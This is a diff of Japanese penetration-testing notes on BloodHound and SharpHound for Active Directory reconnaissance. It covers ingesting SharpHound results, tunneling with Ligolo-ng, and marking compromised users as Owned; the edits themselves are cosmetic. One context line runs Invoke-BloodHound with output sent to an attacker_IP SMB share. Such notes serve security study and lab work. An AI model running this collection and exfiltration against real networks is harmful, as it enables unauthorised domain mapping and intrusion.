@@ -120,8 +120,7 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<attacker_IP>\share -
 > [!INFO]
 > - WinRM接続など、インタラクティブなシェルが使えない場合は [[#SharpHoundの実行エラーとその対策]]を参照 
 > - Tunneling環境では手間だがSharpHoundを転送、結果ファイルを転送させる
-	- `net use`ではポート指定ができないため、Ligolo-ngのListenerで445以外を指定してもSMB接続ができないし、また、Agentが445を使っているとき、Listnerを445に立てて、ということができない
-
+> 	- `net use`ではポート指定ができないため、Ligolo-ngのListenerで445以外を指定してもSMB接続ができないし、また、Agentが445を使っているとき、Listnerを445に立てて、ということができない
 
 3. 攻撃者のマシンに戻り、BloodHoundのAdministration > File IngestでUpload Fileを実行し、SharpHoundの実行結果であるzipファイルをアップロードする
 ![[Pasted image 20251006074057.png]]
@@ -134,7 +133,7 @@ $$File　IngestのStatusがCompleteになれば分析準備OK$$
 
 ## nodeについて
 
-- 🔗[About BloodHound Nodes](https://bloodhound.specterops.io/resources/nodes/overview)
+- [About BloodHound Nodes](https://bloodhound.specterops.io/resources/nodes/overview)
 - ノードをクリックすると、エンティティパネルが表示され、オブジェクトの情報がわかる
 
 | オブジェクトについての情報           | 説明                                  |
@@ -152,7 +151,7 @@ $$エンティティパネル$$
 
 - ノードを右クリックすると、Add to Owned（侵害済みリストに追加）などが可能
 	- 💀：Ownedリストに追加されたノードを意味する
-	- 攻撃ベクターを可視化するため、侵害したユーザーは==必ずAdd to Ownedする==こと
+	- アタックベクターを可視化するため、侵害したユーザーは==必ずAdd to Ownedする==こと
 ![[Pasted image 20251007071811.png | 200]]
 
 - 💎："HIGH VALUE"を意味し、特に重要なオブジェクトや侵害できると大きなメリットがあるオブジェクトを指す
